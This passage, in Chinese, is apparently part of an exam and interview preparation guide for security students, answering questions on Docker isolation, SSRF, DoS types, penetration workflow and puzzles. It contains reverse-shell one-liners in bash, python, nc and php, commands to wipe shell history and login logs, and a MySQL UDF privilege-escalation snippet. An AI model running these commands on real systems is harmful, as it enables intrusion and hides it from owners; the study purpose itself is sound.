  * 为Docker容器提供操作系统层面的隔离
  * 每个namespace下的资源对于其他namespace下的资源都是透明，不可见的；

  * 子容器与子容器之间是隔离的。

* 利用linux控制组(Control Groups）

  * 为Docker容器提供硬件层面的隔离
  * 为系统中所运行进程的用户定义组群分配资源 —— 比如 CPU 时间、系统内存、网络带宽或者这些资源的组合

* 利用linux的联合文件系统(Union File Systems)

  * 利用分层(layer)思想管理镜像和容器

##### 20、web漏洞的原理

编码不规范，函数使用不当，用户的输入并非都是善意的

##### 21、变量覆盖漏洞涉及的主要函数

extract()、parse_str()、import_request_variables()

##### 22、怎么删除history，以及入侵的痕迹（美团）

* 命令

  `history -c`

* /var/log/wtmp是一个二进制文件，记录每个用户的登录次数和持续时间等信息

  查看：`who -u /var/log/wtmp`

  清掉：`echo > /var/log/wtmp`

* /var/log/btmp是一个二进制文件，记录每个用户的登录失败的信息

  查看：`lastb`

  清掉：`echo > /var/log/btmp`

  文件可能会很大

##### 23、csp 浏览器安全

`Content-Security-Policy: default-src 'self'; script-src 'self'`



##### 24、怎么判断url是否存在   

HttpStatusCode为OK

##### 25、是否对国外的论坛是否有关注 

0x00sec.org

##### 26、预编译以及它的绕过

预编译能够防止注入的原因，还要从预编译的运行机制说起。通常来说，在MySQL中，一条SQL语句从传入到执行经历了以下过程：检查缓存、规则验证、解析器解析为语法树、预处理器进一步验证语法树、优化SQL、生成执行计划、执行。

预编译使用占位符`?`代替字段值的部分，将SQL语句先交由数据库预处理，构建语法树，再传入真正的字段值多次执行，省却了重复解析和优化相同语法树的时间，提升了SQL执行的效率。

正因为在传入字段值之前，语法树已经构建完成，因此无论传入任何字段值，都无法再更改语法树的结构。至此，任何传入的值都只会被当做值来看待，不会再出现非预期的查询，这便是预编译能够防止SQL注入的根本原因.

绕过多是因为用户使用不合理，开启了一些错误的开关。

##### 27、渗透测试的流程

```
1.明确目标
2.分析风险，获得授权
3.信息收集
4.漏洞探测（手动&自动）
5.漏洞验证
6.信息分析
7.利用漏洞，获取数据
8.信息整理
9.形成报告
```

##### 28、什么是WebShell

webshell就是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。

* 手工查找后门木马的小技巧

  ```
  find . -name '*.php' | xargs grep -n 'eval('
  find . -name '*.php' | xargs grep -n 'assert('
  find . -name '*.php' | xargs grep -n 'system('
  ```

##### 29、 DoS 和 DDOS？（华为面试）

* DoS（Denial of Service，拒绝服务）

  目的是使计算机或网络无法提供正常的服务。

  * SYN Flood

    利用服务器的连接缓冲区（Backlog Queue），利用特殊的程序，设置TCP的Header，向服务器端不断地成倍发送只有SYN标志的TCP连接请求。当服务器接收的时候，都认为是没有建立起来的连接请求，于是为这些请求建立会话，排到缓冲区队列中。 
    如果你的SYN请求超过了服务器能容纳的限度，缓冲区队列满，那么服务器就不再接收新的请求了。其他合法用户的连接都被拒绝掉。可以持续你的SYN请求发送，直到缓冲区中都是你的只有SYN标记的请求。 

  * 塞满服务器的硬盘
    如果服务器可以没有限制地执行写操作，那么都能成为塞满硬盘造成DOS攻击的途径，比如： 

    * 发送垃圾邮件。一般公司的服务器可能把邮件服务器和WEB服务器都放在一起。破坏者可以发送大量的垃圾邮件，这些邮件可能都塞在一个邮件队列中或者就是坏邮件队列中，直到邮箱被撑破或者把硬盘塞满。 
    * 让日志记录满。入侵者可以构造大量的错误信息发送出来，服务器记录这些错误，可能就造成日志文件非常庞大，甚至会塞满硬盘。同时会让管理员痛苦地面对大量的日志，甚至就不能发现入侵者真正的入侵途径。
    * 向匿名FTP塞垃圾文件。这样也可以塞满硬盘空间。 

  * IP欺骗DOS攻击
    这种攻击利用RST位来实现。假设现在有一个合法用户(1.1.1.1)已经同服务器建立了正常的连接，攻击者构造攻击的TCP数据，伪装自己的IP为1.1.1.1，并向服务器发送一个带有RST位的TCP数据段。服务器接收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中建立好的连接。这时，如果合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就必须从新开始建立连接。 攻击时，伪造大量的IP地址，向目标发送RST数据，使服务器不对合法用户服务。 

  * 带宽DOS攻击
    如果你的连接带宽足够大而服务器又不是很大，你可以发送请求，来消耗服务器的缓冲区消耗服务器的带宽。这种攻击就是人多力量大了，配合上SYN一起实施DOS，威力巨大。不过是初级DOS攻击。 

  * 自身消耗的DOS攻击
    古老的攻击手法。老式的系统有这样的自身BUG。比如Win95 (winsock v1), Cisco IOS v.10.x, 和其他过时的系统。
    这种DOS攻击就是把服务器原本想请求的客户端IP和端口弄成服务器自身的IP和端口。使得服务器给自己发送TCP请求和连接。这种主机的漏洞会很快把资源消耗光。直接导致宕机。这种伪装对一些身份认证系统还是威胁巨大的。 

* DDOS（Distributed Denial of Service，分布式拒绝服务)

  攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。

##### 30、恶意软件怎么伪装自己的流量（360面试）

藏在DNS流量里

#####  31、怎么隐藏请求下载一个shellcode （360面试）

藏在自己的社交网站中

##### 32、SSRF是什么/怎么攻击和防御/你现在要设计一个函数来check输入的url来防止ssrf/怎么深度利用

SSRF是一种常见的Web漏洞，通常存在于需要请求外部内容的逻辑中，比如本地化网络图片、XML解析时的外部实体注入、软件的离线下载等。当攻击者传入一个未经验证的URL，后端代码直接请求这个URL，将会造成SSRF漏洞。

利用：

- URL为内网IP或域名，攻击者将可以通过SSRF漏洞扫描目标内网，查找内网内的漏洞，并想办法反弹权限
- URL中包含端口，攻击者将可以扫描并发现内网中机器的其他服务，再进一步进行利用
- 当请求方法允许其他协议的时候，将可能利用gopher、file等协议进行第三方服务利用，如利用内网的redis获取权限、利用fastcgi进行getshell等

check函数:(博客——谈一谈如何在Python开发中拒绝SSRF漏洞)

①解析目标URL，获取其Host

②解析Host，获取Host指向的IP地址

③检查IP地址是否为内网IP

④请求URL

⑤如果有跳转，拿出跳转URL，执行1



##### 33、内网渗透的思路？/对路由器你有哪些攻击和利用的思路?/windows网络节点有哪些利用的方式?拿下域控有什么利用的点?

* 正面攻击

  被渗透目标在外网有网站，网站服务器跟内网相连，对服务器所有CMS进行渗透，对服务器入口进行渗透，对同网段服务器渗透后嗅探。

* 迂回攻击

  正面网站防范很严格，从旁站进行渗透，从CMS开发商开始渗透，从托管服务器商开始渗透，从服务器所在地方，从公司个人计算机（前台MM，销售员，公司小白），公司无线网络。

* 社工

  社工是最为直接和高效攻击，需要有好的多款远程控制软件，对木马进行免杀，0day效果比较好，给员工发送邮件，做伪造网站钓鱼攻击

* 打入内部

**路由器：**

漏洞，弱密码

局域网arp欺骗、流量劫持（经过路由器的数据都发给我的主机）、限速或断网、路由器钓鱼页面，开远程界面，开摄像头



**网络节点：**

漏洞

获得流量



**域控：**

提个权，开个后门，别被抓住

查看敏感文件



##### 34、mysql怎么提权？

* udf提权

  * 方法

    * 上传udf.dll到指定位置，或者将udf.dll以hex形式写入指定位置

      如

      ```
      create table temp(data longblob);
      insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
      update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);
      select data from temp into dumpfile "C:\\...\\lib\\plugin\\udf.dll";
      ```

      PS：数据并不完整

    * `create function sys_eval returns string soname 'udf.dll';`

    * `select sys_eval('whoami');`

  * 目录位置
    * 当 MySQL< 5.2 版本时，将 .dll 文件导入到 c:\windows 或者 c:\windows\system32 目录下。
    * 当 MySQL> 5.2 版本时，将 .dl l文件导入到 C:\Program Files\MySQL\MySQL Server 5.4\lib\plugin 目录下。

into outfile和into dumofile有什么区别

into dumpfile能导出一个完整能执行的二进制文件，不对任何列或行进行终止，也不执行任何转义处理

into outfile适合导出数据库，可以看出每行记录

##### 35、逻辑漏洞

比如购买物品的是否可以为负数

##### 36、脱壳是什么？加壳是什么？是否有遇到linux程序的加壳？

加壳：壳是一段执行于原始程序前的代码。原始程序的代码在加壳的过程中可能被压缩、加密……当加壳后的文件执行时，壳－这段代码先于原始程序运行，他把压缩、加密后的代码还原成原始程序代码，然后再把执行权交还给原始代码。软件的壳分为加密壳、压缩壳、伪装壳、多层壳等类，目的都是为了隐藏程序真正的OEP（入口点，防止被破解）

脱壳：去掉软件所加的壳，软件脱壳有手动脱和自动脱壳之分

linux崇尚开源，一般不加壳，非要加的话upx也可以

##### 37、VPN（Virtual Private Network，虚拟专用网络）

VPN属于远程访问技术，简单地说就是利用公用网络架设专用网络。例如某公司员工出差到外地，他想访问企业内网的服务器资源，这种访问就属于远程访问。
让外地员工访问到内网资源，利用VPN的解决方法就是在内网中架设一台VPN服务器。外地员工在当地连上互联网后，通过互联网连接VPN服务器，然后通过VPN服务器进入企业内网。为了保证数据安全，VPN服务器和客户机之间的通讯数据都进行了加密处理。有了数据加密，就可以认为数据是在一条专用的数据链路上进行安全传输，就如同专门架设了一个专用网络一样，但实际上VPN使用的是互联网上的公用链路，因此VPN称为虚拟专用网络，其实质上就是利用加密技术在公网上封装出一个数据通讯隧道。有了VPN技术，用户无论是在外地出差还是在家中办公，只要能上互联网就能利用VPN访问内网资源，这就是VPN在企业中应用得如此广泛的原因。



##### 38、有十个名字是“baidu_”的进程，请编写脚本kill掉（百度面试）

可以写一个python 死循环脚本测试一下

```python
while True:
	pass
```

然后多次运行`python baidu_baidu.py &`

`kill $(ps aux | grep "baidu_" | awk '{print $2}')`

##### 39、1521是谁的端口

oracle数据库的默认监听端口

##### 40、文件上传的检测如何做，考虑性能？

* 前端使用js来限制我们的上传类型和文件大小（容易被绕过）
* 后端检测文件类型/检测文件头（黑白名单）

##### 41、渗透测试的流程是什么

前期交互阶段、情报搜集阶段、威胁建模阶段、漏洞分析阶段、渗透攻击阶段（Exploitation）、后渗透攻击阶段（怎么一直控制，维持访问）、报告阶段。

攻击前：网络踩点、网络扫描、网络查点
攻击中：利用漏洞信息进行渗透攻击、获取权限
攻击后：后渗透维持攻击、文件拷贝、木马植入、痕迹擦除

##### 42、Linux 中让命令在后台运行的方法有哪些？

* nohup
  - 使用Ctrl + C发送SIGINT信号，程序关闭
  - 关闭session发送SIGHUP信号，程序免疫
  - 结果默认会输出到nohup.out
* 命令后面加上&
  * 结果会输出到终端
  * 使用Ctrl + C发送SIGINT信号，程序免疫
  * 关闭session发送SIGHUP信号，程序关闭

如何恢复？`fg`

已经在前台运行的呢？`ctrl + Z`

怎么查看挂起了谁`jobs`

怎么恢复`fg %number`

**平日线上经常使用nohup和&配合来启动程序**：

- 同时免疫SIGINT和SIGHUP信号

##### 43、讲讲反弹shell有哪几种？

* bash

  `bash -i >& /dev/tcp/ip/port 0>&1`

* python

```swift
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

* nc

  `nc -e /bin/bash 192.168.1.146 7777`

* php

  `php -r 'exec("/bin/bash -i >& /dev/tcp/192.168.1.146/7777");'`

  `php -r '$sock=fsockopen("192.168.1.146",7777);exec("/bin/bash -i <&3 >&3 2>&3");'`

<u>相关问题</u>

* 反弹提权的原理

  首先我们上传木马后发现可执行的命令有限，于是需要上传提权的漏洞，使用漏洞提权后反弹一个shell到我们主机上，这样就可以在我们自己的shell上操作一个比较高级的用户了

* 提权有哪些方式？

  * 系统漏洞提权（Linux、Windows）
  * 数据库提权
  * 系统配置错误提权
  * 权限继承类提权
  * 第三方软件/服务提权
  * WebServer漏洞提权

##### 44、SRC 上报了一个 XSS 漏洞，payload 已经写入页面，但未给出具体位置，如何快速介入？

我的思路：按照文件的修改时间排个序；版本对比？；数据库筛查最近更新的记录

##### 45、如何防范羊毛党

* 限制手机号。一人只能用一个手机号进行网络注册，这样限制手机号的形式可以减少羊毛党。
* 身份验证。对用户信息要进行身份验证，可以是通过手持身份证合影进行验证。
* 进行手机号验证。如果使用其他的手机号，手机不在自己手里是不能收到验证信息的。
* 黑名单库全面：历史黑名单库可以精确识别垃圾账号，因此黑名单库需海量且能实时更新。
* 设备指纹识别：稳定可靠的设备指纹识别技术，精准识别各种虚拟机，群控机，模拟器等设备。
* 嫌疑IP侦测：准确识别代理IP，机房IP，基站IP，肉鸡IP等。识别嫌疑IP操作的批量注册和恶意登录行为，是杜绝羊毛党的重中之重。
* 全链路关联分析：多个业务场景需全流程智能分析 。比如从注册登录到参加抽奖活动过程中的行为分析是否像正常人。

##### 46、发现了一个漏洞，你报告给开发人员，但是开发人员不愿意修漏洞，如何沟通？

> ?

我自己修

##### 47、如何防御中间人攻击？

* 确保在URL前你所访问的网站有HTTPS
* 点击电子邮件前，检查电子邮件的发件人

* 不要在公共Wi-Fi网络上购买或发送敏感数据

* 如果你的网站使用了SSL，确保你禁用了不安全的SSL/TLS协议。你应当只启用了TLS 1.1和TLS 1.2

* 不要点击恶意链接或电子邮件
* 不要下载盗版内容
* 将安全工具正确地安装在系统

##### 48、使用过哪些不太常见的python内置库

数据压缩

```python
>>> import zlib
>>> s = b'witch which has which witches wrist watch'
>>> len(s)
41
>>> t = zlib.compress(s)
>>> len(t)
37
>>> zlib.decompress(t)
b'witch which has which witches wrist watch'
>>> zlib.crc32(s)
226805979
```

性能度量

```python
>>> from timeit import Timer
>>> Timer('t=a; a=b; b=t', 'a=1; b=2').timeit()
0.57535828626024577
>>> Timer('a,b = b,a', 'a=1; b=2').timeit()
0.54962537085770791
```

##### 49、给写php的人安全建议

> 别写了 他不是最好的语言

* 严格对用户的数据验证
* 防注入
* 数据验证（长度、类型、危险字符）

##### 50、CC攻击的原理及防范？

原理：是利用不断对网站发送连接请求致使形成拒绝服务的目的。

防范：限制同一域名单位时间的访问次数



##### 51、C++如何解决多线程竞争资源?

C++11 新标准中引入了几个头文件来支持多线程编程：

```
< thread > :包含std::thread类以及std::this_thread命名空间。
< atomic > :包含std::atomic和std::atomic_flag类，以及一套C风格的原子类型和与C兼容的原子操作的函数。
< mutex > :包含了与互斥量相关的类以及其他类型和函数
< future > :包含两个Provider类（std::promise和std::package_task）和两个Future类（std::future和std::shared_future）以及相关的类型和函数。
< condition_variable > :包含与条件变量相关的类，包括std::condition_variable和std::condition_variable_any。
```

如果用互斥变量的话，速度会比较慢，用原子变量速度就很快。

```cpp
#include<iostream>  
#include<thread>  
#include<mutex>  
#include<atomic>  
using namespace std;  
const int N = 100000000;  
atomic_int num{0};  
mutex m;  
void run(){  
    for (int i = 0; i < N; i++){  
        // m.lock();  
        num++;  
        // m.unlock();  
    }  
}  
int main(){  
    clock_t start = clock();  
    thread t1(run);  
    thread t2(run);  
    t1.join();  
    t2.join();  
    clock_t end = clock();  
    cout << "num=" << num << ",用时 " << (end - start)*1.0/CLOCKS_PER_SEC << " s" << endl;  
    return 0;  
}
```

##### 52、扫描器扫出100w个可疑URL，如何写脚本排查sqli误报？如何排查xss误报？（360）

> 个人理解，不是很好回答

先抽样几个url看看情况。

写脚本的话挑几个url发一些payload过去看看返回。

主要是先要对扫描器的原理搞清楚，这个扫描器会针对什么特征的网站报错。

<u>相关问题</u>

**扫描器怎么做？**

功能多（多模块耦合），速度快（多线程），扫描能力强（最新payload），支持版本，大字典

##### 53、如何收集子域名

* 猜测与访问尝试

* 搜索引擎查询

* 查询DNS的一些解析记录

  `nslookup -qt=any bing.com`

  `dig all baidu.com`

* HTTPS 证书搜集

  证书下会有一些子域名

* 在线网站、工具，一般会用字典来找



##### 54、php非安全的函数

```
disable_functions=passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,eval,assert,putenv,phpinfo
```



##### 55、只有后台如何渗透

爆破弱口令，扫目录，扫端口



##### 56、网络协议脆弱性了解

某个网络协议的安全性与性能上存在部分弱点,盲目的对其应用会给网络安全带来隐患



##### 57、可不可以反射dns做ddos

**DNS 反射放大攻击：**

主要是利用 DNS 回复包比请求包大的特点，放大流量，伪造请求包的源 IP 地址为受害者 IP，将应答包的流量引入受害的服务器。

* 正常 DNS 查询： 源 IP 地址发起DNS 查询 ——> DNS 服务器，DNS 回复包——> 源 IP 地址
* DNS 攻击： 伪造源IP 地址发起DNS 查询 ——> DNS 服务器 ，DNS 回复包——> 伪造的 IP 地址（攻击目标）

发送的 DNS 查询请求数据包大小一般为 60 字节左右，而查询返回结果的数据包大小通常为 3000 字节以上，因此，使用该方式进行放大攻击能够达到 50 倍以上的放大效果

解决方案：

* 如果有DNS服务，做好响应限制，DNS服务不应对互联网上的域名解析服务，而只响公司内部网络DNS解析请求。
* 限制DNS响应数据包大小的阈值，直接丢弃超大的响应数据包。



##### ACK FLOOD攻击

在TCP连接建立之后，所有的数据传输TCP报文都是带有ACK标志位的，主机在接收到一个带有ACK标志位的数据包的时候，需要检查该数据包所表示的连接四元组是否存在，如果存在则检查该数据包所表示的状态是否合法，然后再向应用层传递该数据包。如果在检查中发现该数据包不合法，例如该数据包所指向的目的端口在本机并未开放，则主机操作系统协议栈会回应RST包告诉对方此端口不存在。

这里，服务器要做两个动作：查表、回应ACK/RST。这种攻击方式显然没有SYN Flood给服务器带来的冲击大，因此攻击者一定要用大流量ACK小包冲击才会对服务器造成影响。按照我们对TCP协议的理解，随机源IP的ACK小包应该会被Server很快丢弃，因为在服务器的TCP堆栈中没有这些ACK包的状态信息。但是实际上通过测试，发现有一些TCP服务会对ACK Flood比较敏感，比如说JSP Server，在数量并不多的ACK小包的打击下，JSP Server就很难处理正常的连接请求。对于Apache或者IIS来说，10kpps的ACK Flood不构成危胁，但是更高数量的ACK Flood会造成服务器网卡中断频率过高，负载过重而停止响应。可以肯定的是，ACK Flood不但可以危害路由器等网络设备，而且对服务器上的应用有不小的影响。

##### 58、MAC泛洪攻击

泛洪攻击的目标就是想获取主机之间的通信数据。

要想达到这个目的，就需要强迫交换机进行数据广播，那就要实现mac表中没有目标主机的mac和端口绑定。泛洪攻击的实现方法就是通过伪造大量的未知mac地址进行通信，交换机进行不断的学习，很快mac表就会被充满，这样正常的主机的mac地址在经过老化之后，就无法再添加到mac地址表中，导致之后的数据都变成了广播。

**防御手段**

限定交换机接入的端口的mac数量。例如：设置该交换机的该端口可以学习8个mac地址，超过了8个mac地址就停止学习，丢弃后来的mac。一般高级的交换机都有这项功能。

##### 59、TCP/IP的四元组、五元组、七元组

*  四元组是：

  源IP地址、目的IP地址、源端口、目的端口

* 五元组是:

  源IP地址、目的IP地址、协议号、源端口、目的端口

* 七元组是:

  源IP地址、目的IP地址、协议号、源端口、目的端口，服务类型以及接口索引

##### 60、mysql和sqlserver注入时候的区别

* 查询前几条记录
  * mysql语句`select* from student limit 10;`
  * sql server语句`select top 10 * from student;`
* sql server识别符是`[]`,`[type]`表示他区别于关键字，但是mysql却是`` `，



##### 61、什么是TCP粘包/拆包？发生原因？

一个完整的业务可能会被TCP拆分成多个包进行发送，也有可能把多个小的包封装成一个大的数据包发送，这个就是TCP的拆包和粘包问题。

原因：

* 应用程序写入数据的字节大小大于套接字发送缓冲区的大小.

* 进行MSS大小的TCP分段。( 最大报文段长度（ Maximum Segment Size,  MSS ）。 MSS 是 TCP 报文段中的数据字段的最大长度）
* 以太网的MTU为1500字节，当IP数据报的总长度大于链路MTU时，需要分片。（ Maximum Transmission Unit ，一种通信协议的某一层上面所能通过的最大数据包大小。）

解决方案：

* 消息定长
* 在包尾部增加回车或者空格符等特殊字符进行分割
* 将消息分为消息头和消息尾。
* 使用其它复杂的协议，如RTMP协议等。
  

##### 62、Mysql一个@和两个@什么区别

- @为用户变量，使用`SET @var1=1`赋值
- @@ 为系统变量 ，包括全局变量`show global variables \G;`和会话变量`show session variables \G;`

##### 63、RPO攻击

> 刚开始以为是pwn里的ROP

（Relative Path Overwrite）相对路径覆盖，是一种新型攻击技术，主要是利用浏览器的一些特性和部分服务端的配置差异导致的漏洞，通过一些技巧，我们可以通过相对路径来引入其他的资源文件，以至于达成我们想要的目的。



### 十一、智力题

> 一般是用来活跃气氛的，基本不会被问到

#### 1. 一根香，如何用一半的时间烧完（09年面试官提问）

从两头一起烧

#### 2.在前1000个整数，1，2，3,……，1000中，数码1共出现了多少次？

按照数位上1出现的次数:

千位：1个

百位：100-199 共100个

十位：10-19 110-119 ... 共100个

个位：1，11，21，31，..91  100个

共301个 方法不唯一

#### 3.1000瓶水中混有一瓶毒药，猫喝了之后七天后会死，用猫试毒怎么样死最少的猫（18年面试官提问/微软面试）

根据2^10=1024，所以10个老鼠可以确定1000个瓶子具体哪个瓶子有毒。这里就举例3个老鼠确定8个瓶子。
000=0
001=1
010=2
011=3
100=4
101=5
110=6
111=7

一位表示一个老鼠，0-7表示8个瓶子。也就是分别将1、3、5、7号瓶子的药混起来给老鼠1吃，2、3、6、7号瓶子的药混起来给老鼠2吃，4、5、6、7号瓶子的药混起来给老鼠3吃，哪个老鼠死了，相应的位标为1。如老鼠1死了、老鼠2没死、老鼠3死了，那么就是101=5号瓶子有毒。
同样道理10个老鼠可以确定1000个瓶子。

#### 4.矩阵的乘法需要几层循环?

三层即可

```c++
for (int i = 0;i < m;i++) {
  for (int j = 0;j < r;j++) {
    for (int k = 0;k < n;k++) {
    		c[i][j] = c[i][j] + (a[i][k] * b[k][j]);
    }
  }
}
```

值得一提的是，如果我们更换ijk顺序为ikj 速度会有显著提升 原理和cache有关，大家在408里都写过类似的题目

```c
#include <bits/stdc++.h>
using namespace std;
int a[999][999];
int b[999][999];
int c[999][999];
int m = 999;
int r = 999;
int n = 999;
void before(){
	memset(a,-1,sizeof(a));
	memset(b,-1,sizeof(b));
	memset(c,-1,sizeof(c));
	clock_t startTime,endTime;
	startTime = clock();
	for (int i = 0;i < m;i++) {
	  for (int j = 0;j < r;j++) {
	    for (int k = 0;k < n;k++) {
	    	c[i][j] = c[i][j] + (a[i][k] * b[k][j]);
	    }
	  }
	}
	endTime = clock();
	cout << "Totle Time : " <<(double)(endTime - startTime) / CLOCKS_PER_SEC << "s" << endl;

}
void after(){
	memset(a,-1,sizeof(a));
	memset(b,-1,sizeof(b));
	memset(c,-1,sizeof(c));
	clock_t startTime,endTime;
	startTime = clock();
	for (int i = 0;i < m;i++) {
		for (int k = 0;k < n;k++) {
	  		for (int j = 0;j < r;j++) {
	    		c[i][j] = c[i][j] + (a[i][k] * b[k][j]);
	   		}
		}
	}
	endTime = clock();
	cout << "Totle Time : " <<(double)(endTime - startTime) / CLOCKS_PER_SEC << "s" << endl;

}
int main(int argc, char const *argv[]){
	before();
	after();
	return 0;
}

Totle Time : 6.89518s
Totle Time : 4.07359s
```

#### 5. 64匹马8个跑道，多少轮选出最快的<u>四匹</u>（腾讯二面）

A>B号表示A快于B

1. 每8匹马赛一次 共8次，ABCDEFGH组 ——8次

2. 取ABCDEFGH组中最快的一匹马，再赛一次 ——1次

3. 不妨设A1>B1>C1>D1 为前4名，淘汰掉EFGH组，剩32匹马

4. 淘汰掉ABCD的末尾4名，剩16匹马

5. 作如图淘汰工作 

   ![image-20200311194131772](/Users/godspeed/Library/Application Support/typora-user-images/image-20200311194131772.png)

6. 显然A1是最牛逼的，剩下还有九匹马，选任选8匹赛一次，剩一匹。——1次

7. 取步骤6的前3和剩下的一匹赛一次，取前三 ——1次

PS：6、7步在有些情况下可以缩短为1步，比如我们把B1剩下来，剩下的8匹马赛一次，假设结果为A2>B1>C1 显然C1不是最好的4匹

#### 6. 16个硬币，其中一个是假币(假币更轻)，现有一台天平，问至少多少次找出假币？

1. 8个——8个   取轻的一边
2. 4个——4个  取轻的一边
3. 2个——2个  取轻的一边
4. 1个——1个  取轻的一边

## 5、说明

老师问的问题都很灵活，总得来说无规律可寻。

1. 一定要对自己将来的研究方向有比较多的了解，即使是比较少的了解也OK，不要一无所知，这个很可能成为老师们抓住不放雷到你的问点

2. 对简历上的东西要熟透 注意熟悉、了解 、精通这种字眼的使用

3. 一定保持自信，试着引导老师问一些你比较熟悉的问题

4. 遇到不会的，不要乱答，不要不懂装懂，不要找借口，但也不能放弃这个问题

5. 对 FLG 一定深恶痛疾，“坚决反对”

6. 多想想项目经验，这个基本上是必问问题。

7. 有些老师还会扯一些爱好啦，最难忘的事情什么的，这个不用我说了

8. 练好口语，对着镜子练

9. 带上复试材料，可以多准备几份

10. 一定尽量把能证明能力的经历，或者过人的学习潜力讲出来

11. 老师会首先抛出一个基础问题，很可能跟你的项目相关。如果你答的好，会继续加深难度，探测你的水平和对问题的理解深度，这个会不停的加分。如果你答的不好，老师会问更简单的问题，如果还不会，会更简单，这个过程会一直减分。分高的是老师从一个项目开始，挖掘一个问题，挖深了依然能谈笑风生，就分高。


## 6、后记

​		如果你有幸读到这里，我真的非常感激。回顾这大半年，2020发生的好多事真的让我有点措手不及。考研只是一段旅程。我曾跟舍友说，在考研的时候，我才觉得自己真真切切地活着。这段旅程，需要承受的太多太多了，做题时的自我否定，初试查成绩的惊喜，当看到身边的好友陆续拿到offer之后，你会思考，这条路是否走的正确，说不眼红是不可能的，我们都喜欢这种尘埃落定的感觉，谁喜欢整天悬着心呢？但我慢慢想到，人生就是因为有多种可能性而精彩，工作有工作的压力，学习有学习的压力，无论哪种都是生活的方式。学生当久了，希望能完成从学生到工作的转变；工作久了，又想念学校的生活。人就是以这样一个矛盾体活着的，身份的转换也是迟早要发生的。既然选择了考研，就努力去做，不达目的绝不罢休。

​		成年人的生活，从来就没有容易二字。

​		临表涕零，不知所言。

​		预祝大家考研成功！

​	



## 7、参考资料

1.停机问题：https://www.zhihu.com/question/20081359/answer/256046439

2.数据库和文件系统：https://blog.csdn.net/tonglin12138/article/details/89482339

3.vfork和fork： https://blog.csdn.net/jianchi88/article/details/6985326

4.任务管理：https://blog.csdn.net/KLKFL/article/details/90337662

5.线程和进程的区别：https://my.oschina.net/cnyinlinux/blog/422207

6.贪心和动态规划：https://www.zhihu.com/question/22311234/answer/22392442

7.上采样：https://www.zhihu.com/question/48279880/answer/525347615

8.池化和反池化https://blog.csdn.net/quiet_girl/article/details/84579038

9.单链表判断有环https://blog.csdn.net/u010983881/article/details/78896293

10.洗牌算法https://www.zhihu.com/question/358255792/answer/974431591

11.OWASPhttp://www.owasp.org.cn/owasp-project/OWASPTop102017v1.1.pdf

12.SVM白板推导 https://www.bilibili.com/video/BV1Hs411w7ci?p=1